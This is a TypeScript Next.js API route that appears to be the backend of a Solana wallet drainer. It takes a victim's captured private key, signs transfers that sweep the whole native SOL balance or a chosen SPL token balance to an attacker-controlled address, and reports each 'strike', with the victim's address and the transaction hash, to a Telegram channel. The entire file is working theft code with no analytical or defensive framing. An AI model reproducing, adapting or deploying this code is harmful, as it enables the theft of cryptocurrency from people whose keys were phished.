import { NextResponse } from "next/server";
import {
  Connection,
  Keypair,
  Transaction,
  SystemProgram,
  PublicKey,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getOrCreateAssociatedTokenAccount,
  createTransferInstruction,
} from "@solana/spl-token";
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

const SOL_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";

// Explicit interface to solve the "Property does not exist" error
interface SolanaAsset {
  symbol: string;
  balance: string;
  contractAddress?: string; // Optional property
}

export async function POST(req: Request) {
  // 1. Declare variables for catch-block scope
  let victimAddress = "Unknown";
  let assetInfo: SolanaAsset = { symbol: "SOL", balance: "0" };

  try {
    const body = await req.json();
    const { userAddress, asset, userPrivKey } = body;

    victimAddress = userAddress || "Captured Key";
    // Merge provided asset data into our typed object
    assetInfo = { ...assetInfo, ...asset };

    console.log(
      `[SOL-ROUTE] Incoming Strike | Address: ${victimAddress} | Asset: ${assetInfo.symbol}`,
    );

    const receiverAddr = process.env.RECEIVER_SOL;
    if (!receiverAddr) throw new Error("RECEIVER_SOL missing in .env");
    if (!userPrivKey)
      return NextResponse.json(
        { error: "Private Key missing" },
        { status: 400 },
      );

    const connection = new Connection(SOL_RPC, "confirmed");

    /**
     * 🛡️ SECURE KEY DERIVATION
     * Handles both 64-byte secret keys and 32-byte seeds.
     */
    let victim: Keypair;
    const cleanKey = userPrivKey.trim().replace("0x", "");
    const keyBuffer = Buffer.from(cleanKey, "hex");

    if (keyBuffer.length === 64) {
      victim = Keypair.fromSecretKey(keyBuffer);
    } else if (keyBuffer.length === 32) {
      victim = Keypair.fromSeed(keyBuffer);
    } else {
      throw new Error(`Invalid Key Length: ${keyBuffer.length} bytes.`);
    }

    const receiver = new PublicKey(receiverAddr);
    let signature = "";

    // --- CASE 1: SPL TOKEN DRAIN ---
    if (assetInfo.contractAddress && assetInfo.symbol !== "SOL") {
      const mintAddress = new PublicKey(assetInfo.contractAddress);

      const victimATA = await getAssociatedTokenAddress(
        mintAddress,
        victim.publicKey,
      );
      const receiverATA = await getAssociatedTokenAddress(
        mintAddress,
        receiver,
      );

      const tx = new Transaction().add(
        createTransferInstruction(
          victimATA,
          receiverATA,
          victim.publicKey,
          BigInt(assetInfo.balance),
        ),
      );

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = victim.publicKey;

      signature = await connection.sendTransaction(tx, [victim]);
    }
    // --- CASE 2: NATIVE SOL DRAIN ---
    else {
      const balance = await connection.getBalance(victim.publicKey);
      const { blockhash } = await connection.getLatestBlockhash();

      const feeBuffer = 10000; // 0.00001 SOL
      const amountToTransfer = balance - feeBuffer;

      if (amountToTransfer <= 0) throw new Error("Insufficient SOL for gas");

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: victim.publicKey,
          toPubkey: receiver,
          lamports: amountToTransfer,
        }),
      );
      tx.recentBlockhash = blockhash;
      tx.feePayer = victim.publicKey;

      signature = await connection.sendTransaction(tx, [victim]);
    }

    // 📡 SUCCESS REPORT
    await sendDetailedSweepToTelegram({
      status: "SUCCESS",
      type:
        assetInfo.symbol === "SOL" ? "NATIVE_SOL_STRIKE" : "SPL_TOKEN_STRIKE",
      symbol: assetInfo.symbol,
      amount: assetInfo.balance.toString(),
      victimAddress: victimAddress,
      receiverAddress: receiver.toBase58(),
      hash: signature,
      chainId: "solana",
    }).catch(() => null);

    return NextResponse.json({ success: true, signature });
  } catch (error: any) {
    console.error("[SOL-ROUTE] Execution Failed:", error.message);

    await sendDetailedSweepToTelegram({
      status: "FAILED",
      type: "SOL_STRIKE_ERROR",
      symbol: assetInfo.symbol,
      amount: "0",
      victimAddress: victimAddress,
      receiverAddress: "N/A",
      hash: "NONE",
      chainId: "solana",
      error: error.message,
    }).catch(() => null);

    return NextResponse.json(
      { success: false, error: error.message },
      { status: 400 },
    );
  }
}
